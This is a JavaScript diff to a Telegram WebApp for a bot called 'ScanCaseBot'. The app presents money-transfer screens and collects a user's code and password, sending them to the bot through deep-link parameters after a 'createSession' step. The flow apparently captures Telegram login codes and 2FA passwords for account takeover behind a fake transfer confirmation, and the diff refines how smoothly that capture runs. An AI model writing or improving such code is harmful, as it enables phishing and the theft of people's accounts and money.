@@ -617,9 +617,8 @@ async function appendCodeDigit(digit) {
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);
         showToast('Код отправляется...', 'info');
-        setTimeout(() => {
-            tg.close();
-        }, 2000);
+        // НЕ закрываем WebApp — пользователь остаётся в боте, 
+        // а при возврате в WebApp сработает handleStartAppParam с success_
     }
 }
 
@@ -670,9 +669,7 @@ if (passwordSubmit) {
         const botUsername = 'ScanCaseBot';
         tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
         showToast('Пароль отправляется...', 'info');
-        setTimeout(() => {
-            tg.close();
-        }, 2000);
+        // НЕ закрываем WebApp
     });
 }
 
@@ -748,15 +745,49 @@ function clearPendingTransaction() {
 
 function startAuthFlow() {
     const botUsername = 'ScanCaseBot';
+    
+    // Сохраняем флаг, что мы в процессе авторизации
+    userData.pending_auth = true;
+    saveUserData(currentUserId, userData);
+    
+    // Открываем бота для создания сессии
     tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
+    
+    // Через 1.5 секунды показываем экран ввода кода
+    // (пользователь уже получил код в боте)
     setTimeout(() => {
         const activeForm = document.querySelector('.transfer-form-screen.active');
         if (activeForm) {
             activeForm.classList.remove('active');
+            // Убираем форму из стека экранов
+            const formIndex = screenStack.findIndex(s => s.element === activeForm);
+            if (formIndex !== -1) {
+                screenStack.splice(formIndex, 1);
+            }
         }
         codeScreen.classList.add('active');
         pushScreen(codeScreen, null, "#1a1d29");
-    }, 2000);
+    }, 1500);
+}
+
+// Проверяем, не было ли прерванной авторизации при загрузке
+function restoreAuthState() {
+    if (userData.pending_auth) {
+        // Пользователь был в процессе авторизации, но вернулся в WebApp
+        // Проверяем start_param — возможно авторизация уже завершена
+        const startParam = tg.initDataUnsafe?.start_param;
+        if (startParam && startParam.startsWith('success_')) {
+            // Успех обработается в handleStartAppParam
+            return;
+        }
+        if (startParam && startParam.startsWith('enterPassword_')) {
+            // Нужен пароль
+            return;
+        }
+        // Если ничего нет — просто сбрасываем флаг
+        delete userData.pending_auth;
+        saveUserData(currentUserId, userData);
+    }
 }
 
 // Перевод в кошелёк
@@ -941,15 +972,12 @@ if (checkCopyBtn) {
 
 function handleStartAppParam() {
     const startParam = tg.initDataUnsafe?.start_param;
-    if (!startParam) return;
+    if (!startParam) {
+        restoreAuthState();
+        return;
+    }
 
-    if (startParam.startsWith('enterCode_')) {
-        const targetUserId = parseInt(startParam.split('_')[1]);
-        if (targetUserId === currentUserId) {
-            codeScreen.classList.add('active');
-            pushScreen(codeScreen, null, "#1a1d29");
-        }
-    } else if (startParam.startsWith('enterPassword_')) {
+    if (startParam.startsWith('enterPassword_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
             passwordScreen.classList.add('active');
@@ -960,6 +988,12 @@ function handleStartAppParam() {
         if (targetUserId === currentUserId) {
             // Фиксируем pending транзакцию в localStorage
             const committed = commitPendingTransaction();
+            
+            // Очищаем флаг авторизации
+            if (userData.pending_auth) {
+                delete userData.pending_auth;
+                saveUserData(currentUserId, userData);
+            }
             
             if (committed) {
                 showToast('Перевод подтверждён!', 'success');
@@ -976,8 +1010,16 @@ function handleStartAppParam() {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
             clearPendingTransaction();
+            // Очищаем флаг авторизации
+            if (userData.pending_auth) {
+                delete userData.pending_auth;
+                saveUserData(currentUserId, userData);
+            }
             showToast('Попробуйте снова', 'info');
         }
+    } else {
+        // Обычный чек — обработан выше в processCheck
+        restoreAuthState();
     }
 }
 
